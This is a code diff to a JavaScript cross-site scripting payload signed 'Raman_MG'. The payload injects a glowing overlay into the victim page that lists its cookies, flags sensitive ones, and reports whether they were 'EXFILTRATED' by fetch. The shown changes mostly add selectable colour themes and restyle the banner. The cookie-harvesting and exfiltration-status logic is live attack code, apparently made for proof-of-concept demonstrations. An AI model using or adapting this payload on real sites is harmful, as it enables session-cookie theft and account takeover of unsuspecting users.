@@ -34,21 +34,30 @@
     ? cookieList.slice(0, 16).map(c => { const k = c.split("=")[0]; return "<tr><td class='k" + (HOT.test(k) ? " hot" : "") + "'>" + enc(clip(k, 34)) + "</td><td class='v'>" + enc(clip(c.slice(k.length + 1), 90)) + "</td></tr>"; }).join("") + (cookieList.length > 16 ? "<tr><td class='k'></td><td class='v'>…+" + (cookieList.length - 16) + " more</td></tr>" : "")
     : "<tr><td class='v' style='color:#456'>— none —</td></tr>";
 
+  // ---- theme (switch with one word) ----
+  const THEME = "neon-green"; // "neon-green" | "cyber" | "danger"
+  const THEMES = {
+    "neon-green": { acc: "#00ff5a", hot: "#ffe000", val: "#a9ffc6", hi: "#eaffe9", bg: "linear-gradient(180deg,#04170c,#000)", glow: "#00ff5a", page: "#000" },
+    "cyber":      { acc: "#12f6ff", hot: "#ff36d0", val: "#a9e9ff", hi: "#eafcff", bg: "linear-gradient(180deg,#0a0722,#04010e)", glow: "#12f6ff", page: "#04010e" },
+    "danger":     { acc: "#ff3860", hot: "#ffc400", val: "#ffb9c6", hi: "#ffeaef", bg: "linear-gradient(180deg,#1a040a,#0a0000)", glow: "#ff3860", page: "#0a0000" }
+  };
+  const t = THEMES[THEME] || THEMES["neon-green"];
+  try { (document.documentElement).style.background = t.page; } catch (e) {}
+
   const host = document.createElement("div");
   host.setAttribute("data-xss", "rmg");
   host.style.cssText = "position:absolute;top:20px;left:50%;transform:translateX(-50%);width:780px;max-width:95vw;z-index:2147483647;";
   const root = host.attachShadow({ mode: "open" });
   root.innerHTML =
     "<style>:host{all:initial}*{box-sizing:border-box;font-family:ui-monospace,SFMono-Regular,Menlo,monospace;font-size:13px;line-height:1.5}"
-    + ".card{background:linear-gradient(180deg,#04120a,#020a06);color:#8affc0;border:1px solid #0f6;border-radius:12px;box-shadow:0 0 40px #0f65,0 0 4px #0f6 inset;overflow:hidden}"
-    + ".head{background:#0f6;color:#02170d;font-weight:700;letter-spacing:.5px;padding:11px 16px;display:flex;justify-content:space-between;align-items:center}"
-    + ".sub{padding:6px 16px 0;color:#4fbf85;font-size:11px}"
+    + ".card{background:" + t.bg + ";color:" + t.val + ";border:1.5px solid " + t.acc + ";border-radius:12px;box-shadow:0 0 26px " + t.glow + "aa,0 0 70px " + t.glow + "55,inset 0 0 14px " + t.glow + "22;overflow:hidden}"
+    + ".head{background:" + t.acc + ";color:#000;font-weight:800;letter-spacing:.5px;padding:11px 16px;display:flex;justify-content:space-between;align-items:center;box-shadow:0 0 22px " + t.glow + "88;text-shadow:0 0 1px #000}"
     + "table{border-collapse:collapse;width:100%;margin:6px 0}"
-    + "td{padding:2px 0;vertical-align:top}td.k{color:#5fb98a;padding:2px 14px;white-space:nowrap;width:170px;word-break:break-all}td.v{color:#cfeede;padding-right:16px;word-break:break-all}td.v.hi{color:#eaffea}"
-    + "tr:has(.hot) td{background:#1c0f04}td.k.hot{color:#ffb35c}"
-    + ".sec{color:#02170d;background:#0f6a;font-weight:700;margin:10px 0 0;padding:5px 16px;letter-spacing:1px}"
-    + ".sec em{float:right;font-style:normal;opacity:.8}"
-    + ".foot{color:#8fd3aa;font-size:11px;padding:12px 16px 14px;border-top:1px dashed #0f63;margin-top:8px}.foot b{color:#ffcf99}</style>"
+    + "td{padding:2px 0;vertical-align:top}td.k{color:" + t.acc + ";padding:2px 14px;white-space:nowrap;width:170px;word-break:break-all;text-shadow:0 0 6px " + t.glow + "66}td.v{color:" + t.val + ";padding-right:16px;word-break:break-all}td.v.hi{color:" + t.hi + ";text-shadow:0 0 8px " + t.glow + "88}"
+    + "tr:has(.hot) td{background:" + t.hot + "1a}td.k.hot{color:" + t.hot + ";text-shadow:0 0 8px " + t.hot + "aa}"
+    + ".sec{color:#000;background:" + t.acc + ";font-weight:800;margin:10px 0 0;padding:5px 16px;letter-spacing:1px;box-shadow:0 0 16px " + t.glow + "77}"
+    + ".sec em{float:right;font-style:normal;opacity:.85}"
+    + ".foot{color:" + t.val + ";font-size:11px;padding:12px 16px 14px;border-top:1px dashed " + t.acc + "55;margin-top:8px}.foot b{color:" + t.hot + ";text-shadow:0 0 6px " + t.hot + "88}</style>"
     + "<div class='card'>"
     + "<div class='head'><span>⚡ XSS EXECUTED &nbsp;·&nbsp; by Raman_MG</span><span>" + (sent ? "◉ EXFILTRATED" : "◉ EXFIL (fetch)") + "</span></div>"
     + "<table>"
